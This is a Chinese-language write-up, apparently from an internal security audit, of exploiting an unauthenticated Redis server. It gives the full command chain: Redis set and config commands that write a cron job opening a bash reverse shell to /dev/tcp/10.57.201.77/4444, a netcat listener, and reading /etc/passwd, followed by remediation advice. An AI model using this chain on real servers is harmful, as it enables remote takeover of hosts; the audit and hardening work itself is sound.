## 1\. 背景

公司内网危险端口扫描时，发现大量6379开放。redis服务默认端口6379(脑子里要有这个条件反射)。于是有了此文章reids未授权访问漏洞利用记录。

## 2\. 发现与利用

利用对象：192.168.6.38  
漏洞利用：redis未授权访问漏洞

### 流程：

A、telnet 192.168.6.38 6379 尝试端口通不通  
B、使用redis-cli工具连接测试存在未授权访问漏洞

![1641547749_61d807e510dbc250b1fb4.png!small?1641547749465](https://image.3001.net/images/20220107/1641547749_61d807e510dbc250b1fb4.png!small?1641547749465)

C、利用redis中set命令写入一下命令：

    
    
    1、set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/10.57.201.77/4444 0>&1\n\n"
    2、config set dir /var/spool/cron
    3、config set dbfilename root
    4、save

  
如下图：![1641547862_61d808569424022e1c753.png!small?1641547863060](https://image.3001.net/images/20220107/1641547862_61d808569424022e1c753.png!small?1641547863060)

D、使用kali linux（10.57.201.77）接收shell  
nc -lvnp 4444  
如下图

![1641547842_61d808429a47205a05c9d.png!small?1641547844281](https://image.3001.net/images/20220107/1641547842_61d808429a47205a05c9d.png!small?1641547844281)

E、查找主机负责人  
cat /etc/passwd  
查看公司哪些人登陆过此主机，联系责任人整改；

![1641547892_61d80874a2b65ad8ae17e.png!small?1641547893950](https://image.3001.net/images/20220107/1641547892_61d80874a2b65ad8ae17e.png!small?1641547893950)

## 3\. 处置建议：

a、为 Redis 添加密码验证（重启redis才能生效）  
修改 redis.conf 文件，添加 requirepass mypassword  
（注意redis不要用-a参数，明文输入密码，连接后使用auth认证）  
b、限制可连接Redis服务器的IP

## 4、参考链接：

[https://developer.aliyun.com/article/515894?spm=5176.21213303.J_6704733920.10.8e623edaF8VZky&scm=20140722.S_community%40%40%E6%96%87%E7%AB%A0%40%40515894._.ID_community%40%40%E6%96%87%E7%AB%A0%40%40515894-RL_redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-OR_main-V_2-P0_1](https://developer.aliyun.com/article/515894?spm=5176.21213303.J_6704733920.10.8e623edaF8VZky&scm=20140722.S_community%40%40%E6%96%87%E7%AB%A0%40%40515894._.ID_community%40%40%E6%96%87%E7%AB%A0%40%40515894-RL_redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-OR_main-V_2-P0_1 "漏洞利用")

[https://developer.aliyun.com/article/533193?spm=5176.21213303.J_6704733920.7.8e623edaF8VZky&scm=20140722.S_community%40%40%E6%96%87%E7%AB%A0%40%40533193._.ID_community%40%40%E6%96%87%E7%AB%A0%40%40533193-RL_redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-OR_main-V_2-P0_0](https://developer.aliyun.com/article/533193?spm=5176.21213303.J_6704733920.7.8e623edaF8VZky&scm=20140722.S_community%40%40%E6%96%87%E7%AB%A0%40%40533193._.ID_community%40%40%E6%96%87%E7%AB%A0%40%40533193-RL_redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-OR_main-V_2-P0_0 "修复建议")

